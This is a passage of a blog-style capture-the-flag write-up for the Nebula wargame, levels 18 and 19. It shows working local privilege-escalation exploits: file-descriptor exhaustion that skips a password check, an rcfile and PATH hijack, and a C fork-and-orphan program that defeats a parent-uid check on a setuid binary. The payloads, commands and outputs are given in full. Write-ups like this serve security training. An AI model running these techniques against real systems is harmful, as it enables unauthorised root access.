        &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;unable to execve&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Permission denied&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;logout&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loggedin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;closelog&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;site exec&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;notsupported&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;setuser&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;setuser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;This is quite a lot a of code, but let's see what it does. The program accepts
two arguments &lt;code&gt;-v&lt;/code&gt; and &lt;code&gt;-d&lt;/code&gt; which increase verbosity level and set a debug file
respectively. If you launch it with &lt;code&gt;flag18 -v -v -v -d /tmp/debug&lt;/code&gt; and then
&lt;code&gt;tail -f /tmp/debug&lt;/code&gt; you can see what's going on. I used 3 &lt;code&gt;-v&lt;/code&gt; because that's
the max debug level to be sure to capture everything.&lt;/p&gt;
&lt;p&gt;Once it's running there's a number of commands we can issue. These are probably
going to give us something to poke around with. We can try to get a shell with
the &lt;em&gt;shell&lt;/em&gt; command, but that means we need to be logged in. I'll make a
note of that. The &lt;code&gt;setuser&lt;/code&gt; function has a fixed sized buffer. Let's try to
overflow that&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; python -c &lt;span class="s2"&gt;&amp;quot;print('setuser ' + 'A'*128)&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./flag18 -v -v -v -d /tmp/flag18/debug
&lt;span class="go"&gt;*** buffer overflow detected ***: ./flag18 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6998d5]
/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0x6986d7]
/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0x697d35]
/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0x61df91]
/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0x5f5305]
/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0x697e09]
/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0x697d1f]
./flag18[0x8048df5]
./flag18[0x8048b1b]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x5cb113]
./flag18[0x8048bb1]
======= Memory map: ========
005b2000-00728000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00728000-0072a000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
0072a000-0072b000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
0072b000-0072e000 rw-p 00000000 00:00 0
0079b000-007b9000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007b9000-007ba000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007ba000-007bb000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007fd000-007fe000 r-xp 00000000 00:00 0          [vdso]
00886000-008a2000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
008a2000-008a3000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
008a3000-008a4000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
099f9000-09a1a000 rw-p 00000000 00:00 0          [heap]
b7832000-b7833000 rw-p 00000000 00:00 0
b783b000-b783e000 rw-p 00000000 00:00 0
bf8bf000-bf8e0000 rw-p 00000000 00:00 0          [stack]
Aborted&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;This led me to learn about &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Stack_canary#Stack_canaries"&gt;stack canaries&lt;/a&gt;, and with this we're out of luck
(for a simple solution). This means the code has been compiled with
&lt;em&gt;FORTIFY_SOURCE&lt;/em&gt; and this also going to prevent string formatting exploits in
the &lt;code&gt;notsupported&lt;/code&gt; function.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; ./flag18 -v -v -v -d /tmp/flag18/debug
&lt;span class="go"&gt;site exec %n
*** %n in writable segment detected ***
Aborted&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Yup. In the process of researching this I also discovered a neat tool called
&lt;a class="reference external" href="http://trapkit.de/tools/checksec.html"&gt;checksec.sh&lt;/a&gt; that can help identify these compiler options early on.&lt;/p&gt;
&lt;p&gt;So what have we got left? The function that checks the password file. If it's
not actually able to find the password file, it will log us in. Unfortunately
we're not able to delete it. However we can make the &lt;code&gt;fopen&lt;/code&gt; call fail another
way. This error has happened a lot at work where we often deal with a lot of
files being open on a single system. Linux systems have a limit as to how
many filedescriptors it can have open at any one time. Because
the tool doesn't close the file descriptors until you call &lt;code&gt;closelog&lt;/code&gt;,
we can just keep opening files until we hit the limit. Let's see what that
limit is.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; &lt;span class="nb"&gt;ulimit&lt;/span&gt; -a
&lt;span class="go"&gt;core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 1817
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 1817
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;1024&lt;/em&gt; is the limit. So let's open 1024 files and see what happens. As we have
a few file descriptors open already we just need to open 1021 more.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; python -c &lt;span class="s2"&gt;&amp;quot;print('login me\n'*1021 + 'shell')&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./flag18 -v -d /tmp/flag18/debug
&lt;span class="go"&gt;./flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Ah, so many file descriptors we can't open any more, not even to shared libraries.
We can close one and see how that goes.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; python -c &lt;span class="s2"&gt;&amp;quot;print('login me\n'*1021 + 'closelog\n' + 'shell')&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./flag18 -v -d /tmp/flag18/debug
&lt;span class="go"&gt;./flag18: -d: invalid option
Usage:  ./flag18 [GNU long option] [option] ...
        ./flag18 [GNU long option] [option] script-file ...
GNU long options:
        --debug
        --debugger
        --dump-po-strings
        --dump-strings
        --help
        --init-file
        --login
        --noediting
        --noprofile
        --norc
        --posix
        --protected
        --rcfile
        --restricted
        --verbose
        --version
Shell options:
        -irsD or -c command or -O shopt_option          (invocation only)
        -abefhkmnptuvxBCHP or -o option&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Right, so we need to remember that we're running &lt;code&gt;sh&lt;/code&gt; here, and our arguments
are being passed to it. Unfortunately &lt;code&gt;-d&lt;/code&gt; and such are not valid here.
Time to read the manual....&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;--rcfile file&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Execute commands from file instead of the system wide
initialization file /etc/bash.bashrc and the standard personal
initialization file ~/.bashrc if the shell is interactive
(see INVOCATION below).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ok, well, it's worth a shot.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; python -c &lt;span class="s2"&gt;&amp;quot;print('login me\n'*1021 + 'closelog\n' + 'shell')&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./flag18 --rcfile -d /tmp/flag18/debug
&lt;span class="go"&gt;./flag18: invalid option -- '-'
./flag18: invalid option -- 'r'
./flag18: invalid option -- 'c'
./flag18: invalid option -- 'f'
./flag18: invalid option -- 'i'
./flag18: invalid option -- 'l'
./flag18: invalid option -- 'e'
/tmp/flag18/debug: line 1: Starting: command not found
/tmp/flag18/debug: line 2: syntax error near unexpected token `('
/tmp/flag18/debug: line 2: `logged in successfully (without password file)'&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Heavens, it worked - sort of. Notice the &lt;em&gt;/tmp/flag18/debug: line 1: Starting: command not found&lt;/em&gt;? That's because our &lt;em&gt;rcfile&lt;/em&gt; is set to be our debug file. So
it writes to the debug file and then the shell will try to execute it. As we know
the first line in the file is &lt;em&gt;Starting up. Verbose level = 1&lt;/em&gt;, so all we really
need to do to quash that error we need to create an executable with that name.
Inside that we will run out beloved &lt;code&gt;getflag&lt;/code&gt;&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; getflag &amp;gt; /tmp/Starting
&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; chmod +x !$
&lt;span class="go"&gt;chmod +x /tmp/Starting
&lt;/span&gt;&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;:/tmp
&lt;span class="gp"&gt;level18&amp;#64;nebula:/home/flag18$&lt;/span&gt; python -c &lt;span class="s2"&gt;&amp;quot;print('login me\n'*1021 + 'closelog\n' + 'shell')&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./flag18 --rcfile -d /tmp/flag18/debug
&lt;span class="go"&gt;./flag18: invalid option -- '-'
./flag18: invalid option -- 'r'
./flag18: invalid option -- 'c'
./flag18: invalid option -- 'f'
./flag18: invalid option -- 'i'
./flag18: invalid option -- 'l'
./flag18: invalid option -- 'e'
You have successfully executed getflag on a target account
/tmp/flag18/debug: line 2: syntax error near unexpected token `('
/tmp/flag18/debug: line 2: `logged in successfully (without password file)'&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The harder ways are beyond what I can do, but for those interested in
circumventing &lt;cite&gt;FORTIFY_SOURCE&lt;/cite&gt; you can read &lt;a class="reference external" href="http://phrack.org/issues/67/9.html"&gt;A Eulogy for Formatting Strings&lt;/a&gt;. I'll be re-reading that for sure.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="flag-19"&gt;
&lt;h2&gt;Flag 19&lt;/h2&gt;
&lt;blockquote&gt;
There is a flaw in the below program in how it operates.&lt;/blockquote&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;pid_t&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;stat&lt;/span&gt; &lt;span class="n"&gt;statbuf&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="cm"&gt;/* Get the parent's /proc entry, so we can verify its user id */&lt;/span&gt;

  &lt;span class="n"&gt;snprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/proc/%d&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getppid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;

  &lt;span class="cm"&gt;/* stat() it */&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;statbuf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to check parent process&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="cm"&gt;/* check the owner id */&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;statbuf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;st_uid&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="cm"&gt;/* If root started us, it is ok to start the shell */&lt;/span&gt;

    &lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Unable to execve&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You are unauthorized to run this program&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So we can get the shell we want if we can run this as root. How can we do that?
This exploits involves a knowledge of Linux forks. Basically if a process
forks and the parent dies, the child will automatically be run under &lt;code&gt;init&lt;/code&gt;.
This is called &lt;a class="reference external" href="http://wiki.linuxquestions.org/wiki/Fork_off_and_die"&gt;Fork off and die&lt;/a&gt;. So who does &lt;cite&gt;init&lt;/cite&gt; run as?&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level19&amp;#64;nebula:/tmp/flag19$&lt;/span&gt; ps aux &lt;span class="p"&gt;|&lt;/span&gt; grep init
&lt;span class="go"&gt;root         1  0.0  0.6   3196  1512 ?        Ss   00:32   0:00 /sbin/init&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;In order to make use of this we need to run &lt;code&gt;flag18&lt;/code&gt; as a forked process and
then kill the parent. The arguments to &lt;code&gt;flag18&lt;/code&gt; are passed onto the shell
it executes, and thus we can make use of this. I'll write some C code
to fork the &lt;code&gt;flag18&lt;/code&gt; process to which we will pass the &lt;code&gt;getflag&lt;/code&gt;. It should
work.&lt;/p&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;childPID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fork&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;childPID&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// forked
&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;childPID&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// child
&lt;/span&gt;            &lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
            &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/getflag&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
            &lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/home/flag19/flag19&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Get the idea? Right, let's taste this pudding&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level19&amp;#64;nebula:/tmp/flag19$&lt;/span&gt; gcc forkit.c -o forkit
&lt;span class="gp"&gt;level19&amp;#64;nebula:/tmp/flag19$&lt;/span&gt; ./forkit
&lt;span class="gp"&gt;level19&amp;#64;nebula:/tmp/flag19$&lt;/span&gt; You have successfully executed getflag on a target account
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Nebula done.&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="closing-words"&gt;
&lt;h2&gt;Closing words&lt;/h2&gt;
